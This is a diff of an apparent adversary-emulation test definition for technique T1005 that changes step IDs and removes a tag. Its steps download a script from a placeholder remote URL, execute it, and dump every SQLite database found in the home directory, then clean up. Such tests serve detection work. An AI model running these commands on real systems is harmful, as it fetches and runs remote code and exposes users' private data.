@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "2bc32861-6382-4abc-9cbd-8521a061cb7b",
+      "id": "2770b443-eea9-4763-8746-f31bfbd507dd",
       "type": "execute-command",
       "data": {
         "command": "cd $HOME\ncurl -O #{remote_url}/art\ncurl -O #{remote_url}/gta.db\ncurl -O #{remote_url}/sqlite_dump.sh\nchmod +x sqlite_dump.sh\nfind . ! -executable -exec bash -c 'if [[ \"$(head -c 15 {} | strings)\" == \"SQLite format 3\" ]]; then echo \"{}\"; ./sqlite_dump.sh {}; fi' \\;\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "db984ddc-1a98-4c0f-b68c-7b23d4398e48",
+      "id": "87af4a0d-4824-49c5-a094-6e933e4aa559",
       "type": "execute-command",
       "data": {
         "command": "rm -f $HOME/.art\nrm -f $HOME/gta.db\nrm -f $HOME/sqlite_dump.sh \n",
@@ -25,7 +25,7 @@
       "elevation_required": false
     },
     {
-      "id": "21d0e6f0-7451-4a55-9eb3-9a74d7739273",
+      "id": "43bb9680-679e-4ac6-8823-6f0853ea68bb",
       "name": "Check dependency 1/1",
       "description": "Check if running on a Debian based machine.\n",
       "type": "execute-command",
@@ -36,7 +36,7 @@
       "elevation_required": false
     },
     {
-      "id": "96b2d79f-e577-4e7d-aeff-6fb28e30e3c3",
+      "id": "d2b28eeb-d832-4c17-ab36-fa3d4767a5ca",
       "name": "Resolve dependency 1/1",
       "description": "Check if running on a Debian based machine.\n",
       "type": "execute-command",
@@ -47,7 +47,7 @@
       "elevation_required": false
     },
     {
-      "id": "3bc98ed8-14de-4741-ada5-b847e76f41b4",
+      "id": "0f682259-0e99-42b7-96ba-1ad594e38285",
       "name": "Re-check dependency 1/1",
       "description": "Check if running on a Debian based machine.\n",
       "type": "execute-command",
@@ -60,39 +60,38 @@
   ],
   "flows": [
     {
-      "s": "2bc32861-6382-4abc-9cbd-8521a061cb7b",
+      "s": "2770b443-eea9-4763-8746-f31bfbd507dd",
       "p": "on-success",
-      "o": "db984ddc-1a98-4c0f-b68c-7b23d4398e48"
+      "o": "87af4a0d-4824-49c5-a094-6e933e4aa559"
     },
     {
-      "s": "2bc32861-6382-4abc-9cbd-8521a061cb7b",
+      "s": "2770b443-eea9-4763-8746-f31bfbd507dd",
       "p": "on-failure",
-      "o": "db984ddc-1a98-4c0f-b68c-7b23d4398e48"
+      "o": "87af4a0d-4824-49c5-a094-6e933e4aa559"
     },
     {
-      "s": "21d0e6f0-7451-4a55-9eb3-9a74d7739273",
+      "s": "43bb9680-679e-4ac6-8823-6f0853ea68bb",
       "p": "on-success",
-      "o": "2bc32861-6382-4abc-9cbd-8521a061cb7b"
+      "o": "2770b443-eea9-4763-8746-f31bfbd507dd"
     },
     {
-      "s": "21d0e6f0-7451-4a55-9eb3-9a74d7739273",
+      "s": "43bb9680-679e-4ac6-8823-6f0853ea68bb",
       "p": "on-failure",
-      "o": "96b2d79f-e577-4e7d-aeff-6fb28e30e3c3"
+      "o": "d2b28eeb-d832-4c17-ab36-fa3d4767a5ca"
     },
     {
-      "s": "96b2d79f-e577-4e7d-aeff-6fb28e30e3c3",
+      "s": "d2b28eeb-d832-4c17-ab36-fa3d4767a5ca",
       "p": "on-success",
-      "o": "3bc98ed8-14de-4741-ada5-b847e76f41b4"
+      "o": "0f682259-0e99-42b7-96ba-1ad594e38285"
     },
     {
-      "s": "3bc98ed8-14de-4741-ada5-b847e76f41b4",
+      "s": "0f682259-0e99-42b7-96ba-1ad594e38285",
       "p": "on-failure",
-      "o": "2bc32861-6382-4abc-9cbd-8521a061cb7b"
+      "o": "2770b443-eea9-4763-8746-f31bfbd507dd"
     }
   ],
   "tags": [
-    "T1005",
-    "atomic-red-team"
+    "T1005"
   ],
   "input_arguments": [
     {
